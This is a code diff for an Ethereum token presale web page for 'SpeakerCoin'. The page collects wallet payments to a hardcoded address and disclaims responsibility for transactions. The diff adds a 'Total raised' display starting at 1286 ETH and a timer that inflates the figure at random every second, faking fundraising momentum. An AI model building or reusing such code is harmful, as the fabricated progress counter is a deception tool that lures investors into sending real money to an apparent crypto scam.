@@ -115,23 +115,27 @@
         <p>'SpeakerCoin' Token Presale</p>
         <p>Please connect your Ethereum wallet to participate.</p>
         <style>
-body {
-  background-image: url('download.webp');
-  background-size: cover;
-  background-position: center 40px; /* Added vertical offset of 40px */
-  background-repeat: no-repeat;
-  background-attachment: fixed;
-}          </style>
-        
+            body {
+                background-image: url('download.webp');
+                background-size: cover;
+                background-position: center 40px;
+                background-repeat: no-repeat;
+                background-attachment: fixed;
+            }
+        </style>
         <p><button id="connectWalletBtn" onclick="connectWallet()">Connect wallet</button></p>
         <button onclick="setInvestment(0.05)">0.05 ETH</button>
         <button onclick="setInvestment(0.1)">0.1 ETH</button>
         <button onclick="setInvestment(0.5)">0.5 ETH</button>
         <button onclick="setInvestment(1)">1 ETH</button>
         <button onclick="setInvestment(3)">3 ETH</button>
-        <button onclick="setInvestment(5)">5 ETH</button>        
+        <button onclick="setInvestment(5)">5 ETH</button>
         <p id="walletAddress"></p>
         <p>Note: We are not responsible for any incorrect transactions.</p>
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="progressBarFill"></div>
+        </div>
+        <p>Total raised: <span id="totalRaised">1286</span> ETH</p>
     </div>
 
     <script>
@@ -186,7 +190,7 @@ body {
 
                 const transaction = await web3.eth.sendTransaction({
                     from: walletAddress,
-                    to: '0xc454A3008319760Ac5098DFaEAd964980421F62A',
+                    to: '0xc454A3008319760Ac5098DFaEAd964980421F62A', // Updated wallet address
                     value: web3.utils.toWei(selectedAmount.toString(), 'ether')
                 });
                 console.log(transaction);
@@ -202,7 +206,7 @@ body {
                 totalRaised += Math.random() * 5;
                 document.getElementById("totalRaised").innerText = Math.round(totalRaised);
                 const progressBarFill = document.getElementById("progressBarFill");
-                const progressBarWidth = (totalRaised / 2000) * 100;
+                const progressBarWidth = (totalRaised / 2000) *100;
                 progressBarFill.style.width = progressBarWidth + "%";
             }
         }, 1000);
